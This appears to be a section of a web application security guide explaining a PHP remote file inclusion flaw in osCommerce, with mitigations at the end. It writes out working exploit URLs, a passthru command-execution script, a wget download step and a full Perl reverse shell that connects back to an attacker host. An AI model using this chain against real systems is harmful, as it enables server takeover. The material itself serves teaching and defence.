<sect1>
	<title>Code Injection</title>
	<para>In a code injection attack the attacker attempts to inject CGI code into the web application. This is a bit different from the other types of code injection, such as operating system commands or SQL queries. The best way to explain this would be to take a live example of a shopping cart software that had such a vulnerability discovered in it.
	</para>
	<para>The osCommerce shopping cart comes with two files called /catalog/includes/include_once.php and
	/catalog/includes/include_once.php. Both these files reference a variable called as $include_file, which is not initialized within the code. For instance, the contents of $include_once.php are:
	</para>
	<para>
	&lt;? 
	  if (!defined($include_file . &apos;__&apos;)) { 
	    define($include_file . &apos;__&apos;, 1); 
	 include($include_file); 
	  } 
	?&gt;
	</para>
	<para>This code could be exploited by an attacker using a URL such as:
	</para>
	<para>http://website.com/catalog/inludes/include_once.php?include_file=ANY_FILE
	</para>
	<para>, he would be able to include any code he wants.
	</para>
	<para>You could even include a file from a third-party location, such as the attacker's website. For instance, with the following code the attacker could determine the Unix version number:
	</para>
	<para>http://website.com/catalog/inludes/include_once.php?include_file=http://attackersite.com/syscmd.php
	</para>
	<para>Where, the contents of syscmd.php could be:
	</para>
	<para>&lt;? passthru(&quot;/bin/uname&quot;)?&gt; 
	</para>
	<para>A more malicious attack would involve, the attacker writing a PHP script that took a particular input, and passed it to the 'passthru' call to be executed as a Unix system command. For instance, the contents of syscmd.php could be:
	</para>
	<para>&lt;? passthru(&quot;$cmd&quot;)?&gt;
	</para>
	<para>This code could be executed repeatedly by the attacker with a URL such as:
	</para>
	<para>http://website.com/catalog/inludes/include_once.php?include_file=http://attackersite.com/syscmd.php?cmd=wget http://attackersite.com/backdoor.pl
	</para>
	<para>Where the contents of backdoor.pl could be something like:
	</para>
	<para>
	#!/usr/bin/perl
	use Socket;
	
	$execute= &apos;echo &quot;`uname -a`&quot;;echo &quot;`id`&quot;;/bin/sh&apos;;
	
	$target=&quot;attackersite.com&quot;;
	$port=&quot;9988&quot;;
	$iaddr=inet_aton($target) || die(&quot;Error: $!\n&quot;);
	$paddr=sockaddr_in($port, $iaddr) || die(&quot;Error: $!\n&quot;);
	$proto=getprotobyname(&apos;tcp&apos;);
	socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);
	connect(SOCKET, $paddr) || die(&quot;Error: $!\n&quot;);
	open(STDIN, &quot;&gt;&amp;SOCKET&quot;);
	open(STDOUT, &quot;&gt;&amp;SOCKET&quot;);
	open(STDERR, &quot;&gt;&amp;SOCKET&quot;);
	system($execute);
	close(STDIN);
	close(STDOUT);
	</para>
	<para>Since backdoor.pl would get downloaded below the $DocumentRoot in Apache, it could then be executed by the attacker, simple as http://website.com/backdoor.pl
	</para>
	<para>On execution, the Perl code would pipe a Unix command shell back to the attacker's site, where he could then simple execute commands with the privilege level of the Apache web server. He could of course use local exploits for Linux kernel vulnerabilities and elevate his privileges.
	</para>
</sect1>

<sect1>
	<title>Mitigation Techniques</title>
	<para>There are multiple ways in which this problem can be mitigated. Besides input validation, the important measure to be implemented is to protect sensitive files such as include_once.php, so that they cannot be accessed directly by a user. This could be done with the help of .htaccess in Apache. The code could also be modified to make sure that the include_file variable is correctly initialized. Further, the attack also works because the PHP register_globals variable is ON. This lets the attacker initialize the variable include_file. As of PHP 4.2.0 this variable is set by default to OFF, and that's how it should stay.
	</para>
</sect1>

